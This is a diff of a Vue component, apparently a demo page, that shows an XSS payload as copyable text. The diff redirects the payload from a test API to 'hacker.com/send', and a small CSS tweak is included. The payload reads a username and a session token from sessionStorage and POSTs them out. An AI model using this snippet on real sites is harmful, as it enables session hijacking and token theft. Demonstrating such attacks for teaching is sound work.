@@ -41,7 +41,7 @@
           &nbsp;&nbsp;&nbsp;&nbsp;token: sessionStorage.getItem('token')<br/>
           };<br/>
           console.log('Ник: ', data.username, '\n\nТокен: ', data.token);<br/>
-          const response = await fetch('https://jsonplaceholder.typicode.com/posts', {<br/>
+          const response = await fetch('http://hacker.com/send', {<br/>
           &nbsp;&nbsp;&nbsp;&nbsp;method: 'POST',<br/>
           &nbsp;&nbsp;&nbsp;&nbsp;headers: {
           &nbsp;&nbsp;&nbsp;&nbsp;'Content-Type': 'application/json'
@@ -49,7 +49,7 @@
           &nbsp;&nbsp;&nbsp;&nbsp;body: JSON.stringify(data)<br/>
           });<br/>
           const result = await response.json();
-      console.log('Response:', result);})()<br/>
+      console.log('Отправлено на сервер hacker.com:', result);})()<br/>
           &lt;/script&gt;&lt;p&gt;</span>
         <button @click="copyToClipboard">Скопировать</button>
       </div>
@@ -174,7 +174,7 @@ img {
   cursor: pointer;
   position: absolute;
   right: 1vw;
-  bottom: 2vh;
+  top: 2vh;
 }
 
 .vk__helper__message button:hover {
